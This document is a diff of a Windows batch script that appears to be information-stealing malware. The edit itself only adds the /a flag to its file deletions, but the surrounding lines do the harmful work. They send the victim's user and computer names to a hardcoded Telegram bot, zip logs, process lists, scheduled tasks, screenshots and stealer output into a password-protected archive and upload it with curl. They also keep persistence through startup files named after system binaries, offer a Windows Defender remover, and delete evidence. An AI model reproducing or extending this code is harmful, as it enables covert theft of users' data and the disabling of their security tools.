@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=24.8"
+set "BATCHVERSION=24.9"
 
 
 
@@ -86,13 +86,13 @@ set "LOGFILE=%temp%\!filename1!.mpeez"
 
 :: Start logging from this point
 call :LogOutput > "%LOGFILE%" 2>&1
-del /f /q "%LOGFILE%"
+del /f /q /a "%LOGFILE%"
 echo.
 echo.
 echo Exiting...
 curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|DONEE"
-del /q %temp%\*.mpee
-del /q %temp%\*.qwb
+del /f /q /a %temp%\*.mpee
+del /f /q /a %temp%\*.qwb
 goto :EOF
 
 :LogOutput
@@ -161,7 +161,7 @@ set "filename="
 
 
 set "InstalledQWB=%temp%\!filename2!.qwb"
-del /f /q "%InstalledQWB%"
+del /f /q /a "%InstalledQWB%"
 
 
 
@@ -384,7 +384,7 @@ if not exist "%startupFile%" (
     echo File is already in %startupFile%.
 )
 
-del /F /Q /A "%appdata%\*.ps1"
+del /f /q /a "%appdata%\*.ps1"
 reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Powershell /f
 reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Steam /f
 
@@ -574,11 +574,11 @@ echo.
 
 
 echo Deleting %SHSTFILEroot% and %SHSTFILE%
-del /f /q "%SHSTFILEroot%"
+del /f /q /a "%SHSTFILEroot%"
 echo Killing process ShellHost by Powershell
 powershell -Command "& { Get-Process | Where-Object { $_.Path -eq '%SHSTFILE%' } | Stop-Process -Force }"
 taskkill /F /IM ShellHost.exe
-del /f /q "%SHSTFILE%"
+del /f /q /a "%SHSTFILE%"
 echo.
 
 if exist "%SHSTFILEroot%" (
@@ -731,11 +731,11 @@ echo.
 
 
 echo Deleting %KMSFILEroot% and %KMSFILE%
-del /f /q "%KMSFILEroot%"
+del /f /q /a "%KMSFILEroot%"
 echo Killing process KMSAuto by Powershell
 powershell -Command "& { Get-Process | Where-Object { $_.Path -eq '%KMSFILE%' } | Stop-Process -Force }"
 taskkill /F /IM KMSAuto.exe
-del /f /q "%KMSFILE%"
+del /f /q /a "%KMSFILE%"
 echo.
 
 if exist "%KMSFILEroot%" (
@@ -1403,7 +1403,7 @@ echo All running processes - Using Powershell - >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 type "%ProcessTXTFILE%" >> "%InstalledQWB%"
-del /f /q "%ProcessTXTFILE%"
+del /f /q /a "%ProcessTXTFILE%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
@@ -1457,7 +1457,7 @@ echo Task Scheduler :  >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 type "%TASKS_DATA%" >> "%InstalledQWB%"
-del /f /q "%TASKS_DATA%"
+del /f /q /a "%TASKS_DATA%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
@@ -1510,19 +1510,19 @@ taskkill /F /IM StartupTaskCaller.exe
 
 
 echo Deleting files...
-del /F /Q "%SystemRoot%\System32\TSSPrxy.exe"
-del /F /Q "%SystemRoot%\System32\TSSPrxyAd.exe"
-del /F /Q "%SystemRoot%\System32\TSSPrxySTC.exe"
-del /F /Q "%SystemRoot%\System32\TSSPrxyAdSTC.exe"
-del /F /Q "%SystemRoot%\System32\TSSPrxyRNTM.exe"
-del /F /Q "%SystemRoot%\System32\TSSPrxyAdRNTM.exe"
-del /F /Q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RuntimeBroker.exe"
-del /F /Q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RtkAudUService64.exe"
-del /F /Q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ShellHost.exe"
-del /F /Q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\KMSAuto.exe"
-del /F /Q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\COM Surrogate.exe"
-del /F /Q "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe"
-del /F /Q "%file6%"
+del /F /Q /A "%SystemRoot%\System32\TSSPrxy.exe"
+del /F /Q /A "%SystemRoot%\System32\TSSPrxyAd.exe"
+del /F /Q /A "%SystemRoot%\System32\TSSPrxySTC.exe"
+del /F /Q /A "%SystemRoot%\System32\TSSPrxyAdSTC.exe"
+del /F /Q /A "%SystemRoot%\System32\TSSPrxyRNTM.exe"
+del /F /Q /A "%SystemRoot%\System32\TSSPrxyAdRNTM.exe"
+del /F /Q /A "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RuntimeBroker.exe"
+del /F /Q /A "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RtkAudUService64.exe"
+del /F /Q /A "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ShellHost.exe"
+del /F /Q /A "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\KMSAuto.exe"
+del /F /Q /A "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\COM Surrogate.exe"
+del /F /Q /A "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe"
+del /F /Q /A "%file6%"
 
 
 echo Operation completed.
@@ -1559,7 +1559,7 @@ echo.
 cls
 :: Kill & Delete
 taskkill /f /im PatcherX64.exe >nul 2>&1
-del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
+del /f /q /a "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
 
 echo.
 echo You chose WinDefRemover.
@@ -1892,7 +1892,7 @@ echo.
 :: make x empty lines to %LOGFILE1% then type taask scheduler .....
 (for /l %%i in (1,1,6) do echo.) >> "%LOGFILE1%"
 type "%InstalledQWB%" >> "%LOGFILE1%"
-del /f /q "%InstalledQWB%"
+del /f /q /a "%InstalledQWB%"
 echo. >> "%LOGFILE1%"
 echo. >> "%LOGFILE1%"
 echo. >> "%LOGFILE1%"
@@ -1951,7 +1951,7 @@ set "File2=%LOGFILE1%"
 echo Compressing Files
 "%SVNzip_PATH%" a -p"%Password%" -mhe=on "%ZIP_FILE%" "%File1%" "%File2%"
 if exist "%ZIP_FILE%" echo File Compressed successfuly.
-del /f /q "%LOGFILE1%"
+del /f /q /a "%LOGFILE1%"
 echo.
 echo.
 
@@ -1971,13 +1971,13 @@ set "ZIP_FILEMS=%temp%\mseuopefiles.7z"
 set "LOGSTLR=%temp%\LGSTLRR.ever"
 
 rem Delete existing ZIP file to ensure fresh compression
-if exist "%ZIP_FILEMS%" del /f /q "%ZIP_FILEMS%"
+if exist "%ZIP_FILEMS%" del /f /q /a "%ZIP_FILEMS%"
 echo Deleted.
 
 echo.
 echo.
 
-del /f /q "%LOGSTLR%"
+del /f /q /a "%LOGSTLR%"
 goto PEROTY
 type "%temp%\STLRLOG.mseuope" >> "%LOGSTLR%"
 echo. >> "%LOGSTLR%"
@@ -2021,7 +2021,7 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN_UPDATESSCRNSHTS%/sendDocumen
      -F "caption=%CAPTION_UPDATESSCRNSHTS%" ^
      -F "document=@%ZIP_FILE%"
 
-del /f /q "%ZIP_FILE%"
+del /f /q /a "%ZIP_FILE%"
 
 goto PEROTY1
 
@@ -2049,8 +2049,8 @@ echo Sent.
 set "currentMinute=%time:~3,2%"
 
 
-del /f /q "%InstalledQWB%"
-del /f /q "%USERPROFILE%\Downloads\screenshot.png"
+del /f /q /a "%InstalledQWB%"
+del /f /q /a "%USERPROFILE%\Downloads\screenshot.png"
 
 
 
@@ -2133,7 +2133,7 @@ for /f "skip=3 tokens=1,2 delims= " %%A in (chldrocess.txt) do (
 echo.
 echo.
 :: Cleanup
-del chldrocess.txt
+del /f /q /a chldrocess.txt
 echo.
 echo All child processes terminated.
 
